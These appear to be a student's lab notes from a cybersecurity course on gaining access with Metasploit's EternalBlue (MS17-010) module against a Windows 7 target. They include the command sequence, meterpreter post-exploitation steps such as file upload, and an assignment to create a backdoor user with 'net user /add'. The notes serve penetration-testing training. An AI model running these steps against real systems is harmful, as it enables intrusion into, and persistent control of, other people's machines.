@@ -1,0 +1,60 @@
+EXPLOITATION (GAININNG ACCES)
+
+Exploit: Code which contains instruction to break the vulnerability and perform the task (execute the code).
+Payload: Code which contains instructions to perform the task (Connect Hacker & Victim so that the Hacker controls the Victim).
+
+Exploitation Steps/Phases
+1) Find the vulnerabilities and record Vuln Name, Vuln Port Number, Vuln Code
+2) Start & Initialize the Metasploit
+3) Search & Import the Exploit script
+4) Configure the script as per your target
+5) Verify the details & execute
+
+Vulnerabilities
+1) Vuln Name: ETERNALBLUE
+   Vuln Port: 445
+   Vuln Code: CVE-2017-0143, MS17-010
+   
+Commands
+	#nmap --script=smb-vuln-* <Target IP>	//Vulnerability Scanning if Nessus scan is not possible
+	#msfdb init		//Inititalize the metasploit database (Only once at 1st attempt)
+	#service postgresql start		//Starting the backend of metasploit (Only once at 1st attempt)
+	#msfconsole		//Start metasploit framework console
+	msf6> search <CVE code>	or search<MS code>	or search <Vuln name>
+		  Ex: search 2017-0143	or	search 17-010	or	search eternalblue
+	msf6> info <id>
+		  Ex: info 0	//Checks whether the script is compatible with the target(Platform, Architecture, Privilege)
+						//Finds the available targets
+						//Basic Options
+	msf6> use <id>		//Importing the exploit script
+		  Ex: use 0
+	msf6 exploit> show options		//Checks the mandatory setting (Set Current Setting if Required: yes)
+	msf6 exploit> set <option-name> <option-value/Current Setting value>
+				  Ex: set RHOSTS 192.168.0.169
+	msf6 exploit> show options
+	msf6 exploit> exploit			//To execute the exploit
+	//meterpreter is the Command Line of the target. It might not always be the meterpreter for other target system OSs.
+	meterpreter> sysinfo			//System information of the target computer
+	meterpreter> ifconfig			//IP address
+	meterpreter> getuid				//Gives the UserID with which you have accessed
+	meterpreter> pwd				//Present Working Directory
+	meterpreter> ls
+	meterpreter> cd .				//Enter target's desktop folder
+				 cd / -> cd Users\\ -> cd Windows7\\ -> cd Desktop or cd C:\\Users\\Windows7\\Desktop
+	meterpreter> ls Users
+	meterpreter> upload /home/kali/attemp1_samarth.txt	//Uploads the file onto the pwd of victim
+		  
+   
+Things to check before importing the exploit script
+	Platform - Should be same as your target
+	Architecture -
+	Privilege - Yes
+	
+Whatsapp group: TINYURL.com/dlithe-CSintern
+	
+Assignment
+1) Create a text file with your name in Desktop
+	Content: Name; USN number
+2) Create a user with your name
+	meterpreter> shell
+	C:\Users\Windows7\Desktop> net user <username> <password> /add
